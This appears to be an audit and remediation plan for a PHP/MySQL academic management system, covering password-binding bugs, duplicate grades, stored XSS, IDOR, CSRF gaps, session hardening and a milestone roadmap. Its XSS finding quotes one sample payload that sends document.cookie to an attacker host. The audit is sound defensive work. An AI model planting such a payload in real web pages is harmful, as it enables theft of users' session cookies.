# CourseMonitor Production Upgrade: Comprehensive Enhancement Plan

**Document Version:** 1.0.0  
**Target Project:** CourseMonitor Academic Management System  
**Working Directory:** `/home/mohammed/Documents/projects/CourseMonitor.backup-20261023`  
**Date:** November 23, 2026  
**Status:** Approved for Implementation  

---

## Table of Contents
1. [Executive Summary & Project Baseline](#1-executive-summary--project-baseline)
2. [Codebase Findings & Gap Analysis](#2-codebase-findings--gap-analysis)
   - [2.1 Business Logic Flaws & Data Integrity Risks](#21-business-logic-flaws--data-integrity-risks)
   - [2.2 System Design, UI/UX & Security Gaps](#22-system-design-uiux--security-gaps)
   - [2.3 Architecture & Infrastructure Deficits](#23-architecture--infrastructure-deficits)
   - [2.4 Testing & Quality Assurance Deficits](#24-testing--quality-assurance-deficits)
3. [Proposed Production Enhancements](#3-proposed-production-enhancements)
   - [3.1 Architecture & Infrastructure Enhancements](#31-architecture--infrastructure-enhancements)
   - [3.2 Database Schema Remediation & Migration](#32-database-schema-remediation--migration)
   - [3.3 Business Logic Remediation & Centralization](#33-business-logic-remediation--centralization)
   - [3.4 Frontend Design, XSS Immunization & UX Resilience](#34-frontend-design-xss-immunization--ux-resilience)
4. [Phased Implementation Roadmap](#4-phased-implementation-roadmap)
   - [4.1 Milestone Breakdown & Dependencies](#41-milestone-breakdown--dependencies)
   - [4.2 File Ownership & Boundary Matrix](#42-file-ownership--boundary-matrix)
   - [4.3 Atomic Git Commit Strategy](#43-atomic-git-commit-strategy)
5. [Verification & Testing Strategy](#5-verification--testing-strategy)
   - [5.1 Zero-Download Test Runner Architecture](#51-zero-download-test-runner-architecture)
   - [5.2 Unit Test Suites](#52-unit-test-suites)
   - [5.3 Integration Test Suites](#53-integration-test-suites)
   - [5.4 Quality Gate & Acceptance Criteria](#54-quality-gate--acceptance-criteria)

---

## 1. Executive Summary & Project Baseline

### 1.1 Project Overview
CourseMonitor is a web-based academic monitoring and reporting platform engineered for higher education institutions. It enables three core academic roles:
- **Administrators**: System management, faculty/department configuration, course assignment, student records, and user provisioning.
- **Department Heads**: Curriculum oversight, attendance and grade auditing, grade modification with mandatory audit logs, and departmental performance analytics.
- **Lecturers**: Course syllabus delivery, daily attendance tracking, coursework assessment entry, CSV-based grade batch importation, and student performance monitoring.

### 1.2 Technology Stack Baseline
- **Backend Runtime**: PHP 8.2 (CLI binary located at `/opt/lampp/bin/php`, standardizing on PHP 8.2.12 NTS).
- **Database Engine**: MySQL / MariaDB (InnoDB storage engine, `utf8mb4` character set, `utf8mb4_general_ci` collation).
- **Frontend Layer**: Vanilla JavaScript (ES6+), HTML5, Bootstrap 5.x CSS framework, FontAwesome icon suite.
- **Web Server Compatibility**: Apache 2.4 (mod_php / php-fpm) or Nginx with FastCGI.
- **Dependency Management**: Native runtime without external Composer or Node package dependencies, adhering to institutional zero-download constraints.

### 1.3 Architecture & Inventory Summary
The existing application follows a classic procedural multi-tier architecture with separate presentation modules, procedural REST-like API endpoints, and centralized include files:
- **Presentation Layer**:
  - `public/`: Public authentication gateways (`login.php`, `signup.php`, `logout.php`, `access_denied.php`).
  - `modules/admin/`: 6 administrative views (`dashboard.php`, `users.php`, `courses.php`, `departments.php`, `faculties.php`, `students.php`).
  - `modules/head/`: 5 departmental supervision views (`dashboard.php`, `courses.php`, `modify_records.php`, `audit_logs.php`, `reports.php`).
  - `modules/lecturer/`: 6 academic delivery views (`dashboard.php`, `attendance.php`, `coursework.php`, `view_attendance.php`, `view_grades.php`, `import_excel.php`).
- **Data Access & API Layer**:
  - `api/`: 23 procedural API scripts processing JSON and form data (`get_students.php`, `save_coursework.php`, `import_grades.php`, `update_record_audit.php`, etc.).
- **Core Includes & Configuration**:
  - `config/db.php`: Database connection instantiation using raw `mysqli`.
  - `includes/auth_functions.php`: Authentication, session verification, and CSRF utilities.
- **Data Persistence**:
  - `CourseMonitor.sql`: Schema definition and baseline seed data covering 11 tables (`users`, `faculties`, `departments`, `courses`, `students`, `enrollments`, `course_semesters`, `content`, `attendance`, `coursework`, `audit_logs`).

### 1.4 Codebase Metrics
- Total PHP Source Files: 45 files.
- Automated Test Suites: 0 files (no existing unit, integration, or functional test coverage).
- Third-Party Package Dependencies: 0 Composer dependencies; legacy bundled PEAR PHPUnit is incompatible with PHP 8.2 (`Call to undefined function each()`).

---

## 2. Codebase Findings & Gap Analysis

A rigorous forensic audit of the repository was conducted across business logic, system design, architecture, security, and quality assurance. The audit identified seven critical system flaws and multiple architectural deficiencies that prevent production deployment.

### 2.1 Business Logic Flaws & Data Integrity Risks

#### 2.1.1 Fatal Password Hash Binding Type-Cast Defect
- **Location**: `public/signup.php` (lines 52–55) and `api/save_user.php` (lines 71–75).
- **Code Reference**:
  ```php
  // public/signup.php:52-54
  $insertStmt = $mysqli->prepare("INSERT INTO users (username, email, full_name, role, department_id, faculty_id, password, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
  $insertStmt->bind_param("sssssiis", $username, $email, $fullName, $role, $department_id, $faculty_id, $hashedPwd, $isActive);
  ```
- **Root Cause**: The type specification string `"sssssiis"` specifies type `'i'` (integer) for parameter index 7 (`$hashedPwd` / `$hashed_pwd`), and type `'s'` for parameter index 8 (`$isActive`).
- **Mechanism of Failure**: When `mysqli_stmt::bind_param` processes a bcrypt hash string (e.g. `"$2y$10$e8..."`) with type specifier `'i'`, PHP coerces the non-numeric string to integer `0`. The user row is inserted with password value `'0'`.
- **System Impact**: When the user subsequently attempts authentication at `public/login.php`, `password_verify($password, '0')` in `includes/auth_functions.php:20` always returns `false`. Every account created via public registration or administrative provisioning is permanently locked out.

#### 2.1.2 Missing Unique Constraint on `coursework` & Grade Duplication
- **Location**: `CourseMonitor.sql` (lines 173–200, 466–472), `api/save_coursework.php` (lines 39–42), `api/import_grades.php` (lines 58–61).
- **Code Reference**:
  ```sql
  -- api/save_coursework.php:39-41
  INSERT INTO coursework (student_id, course_id, assessment_type, grade)
  VALUES (?, ?, ?, ?)
  ON DUPLICATE KEY UPDATE grade = VALUES(grade), recorded_at = CURRENT_TIMESTAMP
  ```
- **Root Cause**: While `attendance` possesses a composite unique index (`UNIQUE KEY unique_attendance (student_id, course_id, date)`), table `coursework` only defines index keys `KEY student_id` and `KEY course_id`. It lacks a `UNIQUE KEY (student_id, course_id, assessment_type)`.
- **Mechanism of Failure**: MySQL's `ON DUPLICATE KEY UPDATE` clause only activates upon a primary key or unique key violation. Because `id` is an auto-incrementing surrogate primary key not supplied in the insert statement, collision never occurs.
- **System Impact**: Submitting or importing grades creates duplicate rows. Seed data in `CourseMonitor.sql` already exhibits this corruption: rows with `id=1` and `id=2` both record Quiz 2 for student 1 in course 3. This corruption invalidates `AVG(grade)` queries in `api/get_reports.php:53` and `api/save_coursework.php:72`, mathematically distorting class grade distributions and performance statistics.

#### 2.1.3 Department Head Assignment Disconnect
- **Location**: `public/signup.php` (line 52), `api/save_user.php`, `api/save_student.php` (line 26), `api/save_course.php` (line 26), `api/get_courses.php` (line 30), `api/get_reports.php` (line 12), `modules/head/*.php`.
- **Root Cause**: When a user registers or is provisioned with role `head`, the script writes `users.department_id = $department_id`. However, all department head authorization queries across the system query `departments.head_id = ?`:
  ```sql
  SELECT id FROM departments WHERE head_id = ?
  ```
- **System Impact**: `departments.head_id` remains `NULL` or points to a previous head. Newly registered or created Department Heads receive "You are not assigned to a department" error messages across all supervisory screens (`modules/head/dashboard.php`, `modules/head/modify_records.php`, `modules/head/reports.php`).

#### 2.1.4 Duplicated Eligible Student Queries (Copy-Paste Anti-Pattern)
- **Location**: `api/get_students.php` (lines 59–71), `api/get_gradebook.php` (lines 59–68), `api/get_attendance_matrix.php` (lines 58–67), `api/download_grade_template.php` (lines 36–46).
- **Code Reference**:
  ```php
  $sql = "SELECT DISTINCT s.id, s.name, s.student_id_number, s.department_id, s.current_semester 
          FROM students s
          LEFT JOIN enrollments e ON s.id = e.student_id AND e.course_id = $course_id
          WHERE (e.id IS NOT NULL)";
  if ($dept_id > 0 && !empty($semesters)) {
      $sem_list = implode(',', array_map('intval', $semesters));
      $sql .= " OR (s.department_id = $dept_id AND s.current_semester IN ($sem_list))";
  }
  ```
- **Root Cause**: The hybrid eligibility logic (combining explicit course enrollments with implicit departmental cohort membership) is duplicated verbatim across four distinct endpoints, interpolating raw `$course_id` into the query string.
- **System Impact**: Maintenance hazard; any bug fix or optimization applied to one endpoint leaves the remaining three inconsistent. Direct string interpolation violates parameterized query best practices.

#### 2.1.5 Unhandled CSV Import Errors & Missing Transaction Boundaries
- **Location**: `api/import_grades.php` (lines 50–110), `api/save_user.php`, `api/save_student.php`.
- **Root Cause**: `api/import_grades.php` reads up to 1,000 CSV rows in a `while` loop without wrapping operations in `$mysqli->begin_transaction()`. Furthermore, there is no validation of file MIME types, extensions, or maximum file upload limits.
- **System Impact**: If the CSV file contains invalid student IDs or invalid grade values on row 50, rows 1 through 49 remain committed to the database, leaving the academic record in a corrupted, half-imported state with no rollback capability.

---

### 2.2 System Design, UI/UX & Security Gaps

#### 2.2.1 Hardcoded Base Paths Breaking Deployment Portability
- **Location**: 40+ occurrences across `index.php`, `includes/auth_functions.php`, `public/login.php`, `public/signup.php`, and `modules/**/*.php`.
- **Code Reference**:
  ```php
  // includes/auth_functions.php:56
  header("Location: /CourseMonitor/public/login.php");
  ```
  ```javascript
  // modules/admin/users.php:122
  fetch('/CourseMonitor/api/get_departments.php')
  ```
- **Root Cause**: URL paths are hardcoded to the specific Apache alias `/CourseMonitor/`.
- **System Impact**: Deploying the repository under a different directory (e.g. root domain `https://course.edu/`, backup folder `CourseMonitor.backup-20261023`, or alternative virtual hosts) causes immediate 404 HTTP errors on every navigation link, form submission, and AJAX fetch call.

#### 2.2.2 Universal Stored Cross-Site Scripting (XSS)
- **Location**: 11 module views across administrative, departmental, and lecturer roles:
  - `modules/admin/users.php:163` (`user.username`, `user.full_name`, `user.email`)
  - `modules/admin/courses.php:199` (`course.code`, `course.name`, `course.department_name`, `course.lecturer_name`)
  - `modules/admin/students.php:121` (`student.student_id_number`, `student.name`, `student.email`, `student.department_name`)
  - `modules/admin/departments.php:97` (`dept.name`, `dept.head_name`, `dept.faculty_name`)
  - `modules/admin/faculties.php:80` (`faculty.name`)
  - `modules/head/modify_records.php:202` (`row.student_name`, `row.student_id_number`, `valDisplay`)
  - `modules/head/audit_logs.php:68` (`reason`, `row.details`, `row.old_value`, `row.new_value`)
  - `modules/head/courses.php:135` (`course.code`, `course.name`)
  - `modules/head/reports.php:190` (`r.student_name`, `r.course_code`)
  - `modules/lecturer/attendance.php:143` (`student.student_id_number`, `student.name`)
  - `modules/lecturer/coursework.php:167` (`student.student_id_number`, `student.name`)
  - `modules/lecturer/view_attendance.php:163` (`student.student_id_number`, `student.name`)
  - `modules/lecturer/view_grades.php:129` (`student.student_id_number`, `student.name`)
- **Code Reference**:
  ```javascript
  tbody.innerHTML += `
      <tr>
          <td>${user.username}</td>
          <td>${user.full_name}</td>
          <td>${user.email}</td>
          <td><span class="badge ${badgeClass}">${user.role}</span></td>
  `;
  ```
- **Root Cause**: User-supplied values received via API JSON responses are concatenated directly into HTML strings assigned to `innerHTML` without entity encoding.
- **System Impact**: An attacker registering with a malicious payload in `full_name` (e.g. `<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>`) executes arbitrary JavaScript in the context of any administrator or department head viewing the user list.

#### 2.2.3 API Role Enforcement Redirection Defect
- **Location**: `includes/auth_functions.php` (lines 54–64).
- **Code Reference**:
  ```php
  function requireRole($allowed_roles) {
      if (!isLoggedIn()) {
          header("Location: /CourseMonitor/public/login.php");
          exit;
      }
      if (!in_array($_SESSION['role'], (array)$allowed_roles)) {
          header("Location: /CourseMonitor/public/access_denied.php");
          exit;
      }
  }
  ```
- **Root Cause**: `requireRole()` issues HTTP 302 redirects with HTML bodies regardless of whether the incoming request is a browser page request or an asynchronous API AJAX request.
- **System Impact**: When an authenticated session expires while a user is interacting with an interface, subsequent `fetch()` requests follow the 302 redirect, receive the HTML content of `login.php`, and attempt `response.json()`. This triggers an unhandled `SyntaxError: Unexpected token '<'`, freezing the UI in a loading state without presenting a login prompt.

#### 2.2.4 Missing CSRF Verification on Mutation Endpoints
- **Location**: `api/parse_csv.php` (lines 1–16), `public/signup.php`.
- **Root Cause**: While `includes/auth_functions.php` provides `generateCsrfToken()` and `verifyCsrfToken()`, `api/parse_csv.php` does not invoke verification on file upload requests. Additionally, tokens are not regenerated upon privilege transition (login).
- **System Impact**: Susceptibility to Cross-Site Request Forgery, enabling malicious sites to submit files or trigger actions on behalf of authenticated lecturers or administrators.

---

### 2.3 Architecture & Infrastructure Deficits

#### 2.3.1 Audit Log Action Length Truncation Crash
- **Location**: `CourseMonitor.sql` (lines 63–75), `api/update_record_audit.php` (lines 105–111).
- **Code Reference**:
  ```sql
  -- CourseMonitor.sql:67
  `action` varchar(50) NOT NULL
  ```
  ```php
  // api/update_record_audit.php:105
  $action = "UPDATE (Reason: $reason)";
  $audit = $mysqli->prepare("INSERT INTO audit_logs (table_name, record_id, action, old_value, new_value, modified_by) VALUES (?, ?, ?, ?, ?, ?)");
  $audit->bind_param("sissii", $table_name, $id, $action, $old_value, $new_value, $head_id);
  ```
- **Root Cause**: The prefix `"UPDATE (Reason: "` consumes 16 characters. If the department head enters an audit explanation longer than 34 characters (50 - 16 = 34), `$action` exceeds the column limit.
- **System Impact**: MySQL in `STRICT_TRANS_TABLES` mode raises `mysqli_sql_exception: Data too long for column 'action' at row 1`. The exception triggers `$mysqli->rollback()`, failing grade or attendance adjustments whenever a comprehensive reason is provided.

#### 2.3.2 Session Cookie Insecurity
- **Location**: `includes/auth_functions.php` (lines 1–5, 30–45).
- **Root Cause**: `session_start()` is invoked without prior configuration of `session_set_cookie_params()`. Cookie attributes `HttpOnly`, `SameSite`, and `Secure` are omitted. Furthermore, `logout()` destroys session data on the server but leaves the session cookie intact in the client browser.
- **System Impact**: Session cookies can be accessed by client-side scripts (amplifying XSS vulnerabilities) and are transmitted over unencrypted HTTP connections.

#### 2.3.3 Global State Leakage & Database Coupling
- **Location**: `config/db.php` (lines 4–15).
- **Root Cause**: Hardcoded credentials (`root` / `123`), absence of environment variable loading (`getenv()`), and unhandled connection failures that call `die("Connection failed: " . $mysqli->connect_error)`.
- **System Impact**: Inability to configure credentials for staging/production environments without modifying tracked source code; exposure of database host and internal error details to end users during outages.

#### 2.3.4 Missing Rate Limiting on Authentication Endpoints
- **Location**: `public/login.php`, `public/signup.php`.
- **Root Cause**: No throttling, exponential backoff, or IP-based attempt tracking on failed logins.
- **System Impact**: Vulnerability to brute-force credential stuffing attacks against faculty and administrator accounts.

#### 2.3.5 Missing Authorization & Ownership Checks (IDOR)
- **Location**: `api/get_coursework.php` (lines 17–27), `api/get_assessment_types.php` (lines 8–18), `api/get_users.php` (lines 3–4).
- **Root Cause**: In `api/get_coursework.php`, role `head` bypasses course-to-department ownership validation, allowing any Department Head to view grades of courses belonging to unrelated departments. In `api/get_users.php`, role `head` is permitted to query all system users, leaking administrator accounts and contact details.

---

### 2.4 Testing & Quality Assurance Deficits

#### 2.4.1 Complete Absence of Automated Testing
- **Observation**: Zero test files across the repository (`find . -iname "*test*"` returns 0).
- **Risk**: Any bug fix or structural refactoring carries immediate regression risk, as verification has historically relied solely on ad-hoc manual testing.

#### 2.4.2 Incompatibility of Legacy PHPUnit
- **Observation**: Running the system-installed PHPUnit at `/opt/lampp/bin/phpunit` under PHP 8.2 fails with:
  ```
  Fatal error: Uncaught Error: Call to undefined function each() in /opt/lampp/lib/php/PHPUnit/Util/Getopt.php:81
  ```
- **Constraint**: The institutional Mandatory Download Permission Policy prohibits downloading Composer packages or external PHPUnit archives.
- **Solution**: A native, zero-external-download test runner architecture must be constructed in `tests/run_tests.php` to provide comprehensive automated verification.

---

## 3. Proposed Production Enhancements

### 3.1 Architecture & Infrastructure Enhancements

#### 3.1.1 Configuration Centralization & Environment Abstraction
Refactor `config/db.php` to decouple database credentials from source code using `getenv()` with safe fallback defaults, while suppressing sensitive database connection errors from public output.

```php
// config/db.php interface contract
$host     = getenv('DB_HOST') ?: 'localhost';
$db_name  = getenv('DB_NAME') ?: 'CourseMonitor';
$username = getenv('DB_USER') ?: 'root';
$password = getenv('DB_PASS') !== false ? getenv('DB_PASS') : '123';
$port     = (int)(getenv('DB_PORT') ?: 3306);
```

#### 3.1.2 Dynamic Base URL Resolution
Implement a canonical helper function `base_url(string $path = ''): string` within `includes/auth_functions.php`.

```php
/**
 * Resolves application-relative paths to absolute web root URLs dynamically.
 * Handles subdirectories, root deployments, and reverse proxy prefixes.
 *
 * @param string $path Relative path to append.
 * @return string Normalized URL path.
 */
function base_url(string $path = ''): string {
    $scriptName = $_SERVER['SCRIPT_NAME'] ?? '';
    // Detect base directory relative to web root
    $docRoot = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? ''), '/');
    $appRoot = rtrim(str_replace('\\', '/', dirname(__DIR__)), '/');
    
    $base = '';
    if (!empty($docRoot) && str_starts_with($appRoot, $docRoot)) {
        $base = substr($appRoot, strlen($docRoot));
    } else {
        // Fallback: extract base from SCRIPT_NAME
        $pos = strpos($scriptName, '/CourseMonitor');
        if ($pos !== false) {
            $base = '/CourseMonitor';
        }
    }
    
    $base = rtrim($base, '/');
    $path = ltrim($path, '/');
    return $path === '' ? ($base === '' ? '/' : $base) : $base . '/' . $path;
}
```

#### 3.1.3 Structured API Response Envelopes & Error Handling
Standardize API responses by introducing structured helper functions in `includes/auth_functions.php`:

```php
/**
 * Emits a JSON success response envelope and terminates execution.
 *
 * @param mixed $data Payload to return.
 * @param int $statusCode HTTP response status code.
 * @return never
 */
function json_response(mixed $data, int $statusCode = 200): void {
    if (!headers_sent()) {
        http_response_code($statusCode);
        header('Content-Type: application/json; charset=utf-8');
    }
    echo json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

/**
 * Emits a JSON error response envelope and terminates execution.
 *
 * @param string $message Error description.
 * @param int $statusCode HTTP error status code (400, 401, 403, 404, 500).
 * @return never
 */
function json_error(string $message, int $statusCode = 400): void {
    json_response(['error' => $message], $statusCode);
}
```

#### 3.1.4 Context-Aware Role Enforcement
Update `requireRole(array|string $roles): void` to inspect request headers and path conventions. If the request originates from an API endpoint (e.g. URI begins with `/api/` or `HTTP_ACCEPT` includes `application/json`), it returns HTTP 401 or 403 JSON envelopes rather than issuing HTML 302 redirects:

```php
function requireRole(array|string $allowed_roles): void {
    $roles = (array)$allowed_roles;
    $isApi = str_contains($_SERVER['SCRIPT_NAME'] ?? '', '/api/') || 
             (isset($_SERVER['HTTP_ACCEPT']) && str_contains($_SERVER['HTTP_ACCEPT'], 'application/json'));

    if (!isLoggedIn()) {
        if ($isApi) {
            json_error('Unauthorized: Authentication required', 401);
        }
        header("Location: " . base_url('public/login.php'));
        exit;
    }

    if (!in_array($_SESSION['role'] ?? '', $roles, true)) {
        if ($isApi) {
            json_error('Forbidden: Insufficient privileges', 403);
        }
        header("Location: " . base_url('public/access_denied.php'));
        exit;
    }
}
```

#### 3.1.5 Session Security Hardening
Configure secure cookie attributes prior to invoking `session_start()` in `includes/auth_functions.php`:
- `lifetime`: 0 (session expires when browser closes).
- `path`: `/`.
- `secure`: Enabled when `HTTPS` is active.
- `httponly`: `true` (prevents client-side JavaScript access).
- `samesite`: `'Lax'` (mitigates cross-site request forgery).
- On `logout()`: Invalidate cookie via `setcookie(session_name(), '', time() - 42000, ...)`.
- On `login()`: Regenerate session ID and generate a fresh CSRF token.

---

### 3.2 Database Schema Remediation & Migration

Create a dedicated migration script `migrations/001_remediation.sql` executed during deployment:

#### 3.2.1 Deduplicate `coursework` & Apply Composite Unique Constraint
```sql
-- Step 1: Remove existing duplicate coursework records, keeping the latest recorded_at entry
DELETE c1 FROM coursework c1
INNER JOIN coursework c2 
WHERE c1.id < c2.id 
  AND c1.student_id = c2.student_id 
  AND c1.course_id = c2.course_id 
  AND c1.assessment_type = c2.assessment_type;

-- Step 2: Establish the unique composite constraint
ALTER TABLE coursework 
  ADD CONSTRAINT unique_student_course_assessment 
  UNIQUE (student_id, course_id, assessment_type);
```

#### 3.2.2 Audit Log Table Structural Expansion
```sql
-- Step 1: Expand action column to accommodate descriptor tags
ALTER TABLE audit_logs 
  MODIFY COLUMN action VARCHAR(100) NOT NULL;

-- Step 2: Add dedicated reason column to isolate freeform justification text
ALTER TABLE audit_logs 
  ADD COLUMN reason TEXT DEFAULT NULL AFTER new_value;

-- Step 3: Backfill reason from existing action strings matching 'UPDATE (Reason: %)'
UPDATE audit_logs 
  SET reason = SUBSTRING(action, 17, CHAR_LENGTH(action) - 17),
      action = 'UPDATE'
  WHERE action LIKE 'UPDATE (Reason: %)';
```

---

### 3.3 Business Logic Remediation & Centralization

#### 3.3.1 Password Hash Type Specifier Correction
In `public/signup.php` and `api/save_user.php`, update parameter binding format strings from `"sssssiis"` to `"sssssiss"` (or `"ssssisis"` depending on parameter ordering):
- Parameter 7 (`$hashedPwd` / `$hashed_pwd`): Bind as `'s'` (string).
- Parameter 8 (`$isActive` / `$is_active`): Bind as `'i'` (integer).

#### 3.3.2 Centralized Student Eligibility Engine
Create `includes/course_functions.php` defining the canonical student resolution function, deprecating duplicated SQL across the four API endpoints:

```php
/**
 * Resolves all eligible students for a course via explicit enrollments
 * or implicit cohort matching (department + active semester).
 *
 * @param mysqli $mysqli Active database connection.
 * @param int $course_id Target course identifier.
 * @return array<int, array{id: int, name: string, student_id_number: string, department_id: int, current_semester: int}>
 */
function get_enrolled_students(mysqli $mysqli, int $course_id): array {
    // 1. Fetch course department and configured semesters
    $stmt = $mysqli->prepare("
        SELECT c.id, c.department_id, GROUP_CONCAT(cs.semester_number) AS semesters
        FROM courses c
        LEFT JOIN course_semesters cs ON c.id = cs.course_id
        WHERE c.id = ?
        GROUP BY c.id
    ");
    $stmt->bind_param("i", $course_id);
    $stmt->execute();
    $course = $stmt->get_result()->fetch_assoc();
    $stmt->close();

    if (!$course) {
        return [];
    }

    $dept_id = (int)$course['department_id'];
    $semesters = $course['semesters'] ? explode(',', $course['semesters']) : [];

    // 2. Query students via prepared statement logic
    $sql = "SELECT DISTINCT s.id, s.name, s.student_id_number, s.department_id, s.current_semester 
            FROM students s
            LEFT JOIN enrollments e ON s.id = e.student_id AND e.course_id = ?
            WHERE (e.id IS NOT NULL)";

    if ($dept_id > 0 && !empty($semesters)) {
        $sem_list = implode(',', array_map('intval', $semesters));
        $sql .= " OR (s.department_id = " . (int)$dept_id . " AND s.current_semester IN ($sem_list))";
    }
    $sql .= " ORDER BY s.name ASC";

    $stmt2 = $mysqli->prepare($sql);
    $stmt2->bind_param("i", $course_id);
    $stmt2->execute();
    $result = $stmt2->get_result();
    
    $students = [];
    while ($row = $result->fetch_assoc()) {
        $students[] = $row;
    }
    $stmt2->close();
    return $students;
}
```

#### 3.3.3 Department Head Synchronization
When a user is assigned role `head` during signup (`public/signup.php`) or administrative modification (`api/save_user.php`, `api/save_department.php`):
- Enforce transactional integrity.
- Atomically update `users.department_id = $dept_id` AND `departments.head_id = $user_id`.

#### 3.3.4 Batch Transaction Boundaries & CSV Hardening
Refactor `api/import_grades.php`:
- Wrap row ingestion loop within `$mysqli->begin_transaction()` and `$mysqli->commit()`.
- Validate file extensions (`.csv`), MIME types (`text/csv`, `text/plain`), and maximum upload size (5 MB limit).
- Reject execution and trigger `$mysqli->rollback()` upon any critical database error, returning a clean error envelope to the client.

#### 3.3.5 Access Control & IDOR Mitigation
- In `api/get_coursework.php`: For role `head`, verify that the requested course belongs to a department where `departments.head_id = $_SESSION['user_id']`.
- In `api/get_assessment_types.php`: Verify that the requesting lecturer teaches the course or that the department head manages the course's department.
- In `api/get_users.php`: Restrict role `head` to viewing only users within their own department.

---

### 3.4 Frontend Design, XSS Immunization & UX Resilience

#### 3.4.1 Universal HTML Escaping Utility
Establish a centralized JavaScript escaping function across all modules:

```javascript
/**
 * Sanitizes untrusted strings for safe interpolation into innerHTML.
 *
 * @param {any} str Input value to sanitize.
 * @returns {string} HTML-escaped string.
 */
function escapeHtml(str) {
    if (str === null || str === undefined) return '';
    return String(str).replace(/[&<>"']/g, function(match) {
        return {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        }[match];
    });
}
```

#### 3.4.2 Frontend InnerHTML Immunization
Refactor table row rendering across all 11 affected module views to wrap all dynamic variables in `escapeHtml()`. Example remediation in `modules/admin/users.php`:

```javascript
// Remediated rendering logic
tbody.innerHTML += `
    <tr>
        <td>${escapeHtml(user.username)}</td>
        <td>${escapeHtml(user.full_name)}</td>
        <td>${escapeHtml(user.email)}</td>
        <td><span class="badge ${badgeClass}">${escapeHtml(user.role)}</span></td>
        <td>${escapeHtml(user.department_name || '-')}</td>
        <td>${escapeHtml(user.faculty_name || '-')}</td>
        <td><span class="badge ${statusBadge}">${escapeHtml(statusText)}</span></td>
        <td>
            <button class="btn btn-sm btn-outline-primary" onclick="editUser(${Number(user.id)})">Edit</button>
            <button class="btn btn-sm btn-outline-danger" onclick="deleteUser(${Number(user.id)})">Delete</button>
        </td>
    </tr>
`;
```

#### 3.4.3 Unified AJAX Error Envelope Handling
Refactor frontend `fetch()` calls to handle non-200 HTTP statuses and structured JSON error envelopes:

```javascript
fetch(url, options)
    .then(async response => {
        const contentType = response.headers.get('content-type');
        const isJson = contentType && contentType.includes('application/json');
        const data = isJson ? await response.json() : null;

        if (response.status === 401) {
            window.location.href = window.BASE_URL + '/public/login.php';
            throw new Error('Session expired. Redirecting to login...');
        }
        if (!response.ok) {
            const errorMsg = (data && data.error) ? data.error : `HTTP Error ${response.status}`;
            throw new Error(errorMsg);
        }
        return data;
    })
    .catch(err => {
        showToast(err.message, 'danger');
    });
```

---

## 4. Phased Implementation Roadmap

### 4.1 Milestone Breakdown & Dependencies

```
┌────────────────────────────────────────────────────────┐
│ M0: Comprehensive Enhancement Plan Document            │
│ Status: IN PROGRESS (ENHANCEMENT_PLAN.md produced)    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│ M1: Architecture & Security Foundations                │
│ • Centralize config/db.php with getenv()               │
│ • Implement base_url() and json_response/error helpers │
│ • Context-aware requireRole() (401/403 JSON for APIs)  │
│ • Session hardening (HttpOnly, SameSite, Secure)       │
│ • Database schema remediation (001_remediation.sql)    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│ M2: Business Logic Fixes & Data Integrity              │
│ • Fix password hashing type-cast ('s' vs 'i')          │
│ • coursework unique constraint & deduplication        │
│ • Synchronize Department Head assignments              │
│ • Centralize student query in course_functions.php     │
│ • Transactions in CSV import and entity saves          │
│ • IDOR & role ownership verification                   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│ M3: Frontend Design & XSS Immunization                 │
│ • Implement global escapeHtml() utility                │
│ • Immunize innerHTML in 11 module views                │
│ • Dynamic JavaScript API path resolution               │
│ • Graceful AJAX error envelope handling                │
│ • CSRF token injection in forms and CSV uploads        │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│ M4: Automated Verification & Test Suite                │
│ • Native PHP test runner (tests/run_tests.php)         │
│ • Unit test suite (auth, base_url, functions, XSS)     │
│ • Integration test suite (schema, registration, logic) │
│ • 100% test pass verification under PHP 8.2 CLI        │
└────────────────────────────────────────────────────────┘
```

### 4.2 File Ownership & Boundary Matrix

| Milestone | Target Files | Primary Responsibility |
|---|---|---|
| **M0** | `ENHANCEMENT_PLAN.md` | Enhancement documentation & roadmap |
| **M1** | `config/db.php`<br>`includes/auth_functions.php`<br>`migrations/001_remediation.sql` | Configuration, base URL, session security, API envelopes, schema migration |
| **M2** | `public/signup.php`<br>`api/save_user.php`<br>`api/save_coursework.php`<br>`api/import_grades.php`<br>`api/update_record_audit.php`<br>`api/get_students.php`<br>`api/get_gradebook.php`<br>`api/get_attendance_matrix.php`<br>`api/download_grade_template.php`<br>`api/get_coursework.php`<br>`includes/course_functions.php` | Password hash binding, head sync, coursework deduplication, student queries, transactions, IDOR checks |
| **M3** | `modules/admin/*.php`<br>`modules/head/*.php`<br>`modules/lecturer/*.php`<br>`index.php`<br>`public/*.php` | XSS immunization (`escapeHtml`), base URL updates, AJAX error handling, CSRF integration |
| **M4** | `tests/run_tests.php`<br>`tests/unit/*.php`<br>`tests/integration/*.php` | Native test runner, unit suites, integration suites |

### 4.3 Atomic Git Commit Strategy

Every enhancement will be committed as an atomic, isolated git commit with structured semantic commit messages, enabling a clean git history for upstream review:

1. `docs: produce comprehensive production enhancement plan covering logic, design, architecture, and verification` (Milestone M0)
2. `feat(config): centralize database configuration and dynamic base_url resolution` (Milestone M1)
3. `feat(auth): harden session security and introduce structured JSON API response envelopes` (Milestone M1)
4. `feat(schema): create database remediation migration for coursework constraints and audit logs` (Milestone M1)
5. `fix(auth): correct password hash binding specifier from integer to string in signup and user save` (Milestone M2)
6. `fix(grades): enforce coursework unique constraint and wrap CSV imports in transactions` (Milestone M2)
7. `fix(head): synchronize department head assignments between users and departments` (Milestone M2)
8. `refactor(courses): centralize eligible student enrollment query logic into course_functions` (Milestone M2)
9. `fix(security): resolve IDOR and unauthorized access in coursework and user APIs` (Milestone M2)
10. `feat(security): implement shared escapeHtml utility and immunize frontend innerHTML against XSS` (Milestone M3)
11. `refactor(views): update hardcoded base paths and improve AJAX error handling across modules` (Milestone M3)
12. `test: implement zero-dependency native PHP test runner and unit test suites` (Milestone M4)
13. `test: add integration test suites covering schema constraints, auth, and grade calculations` (Milestone M4)

---

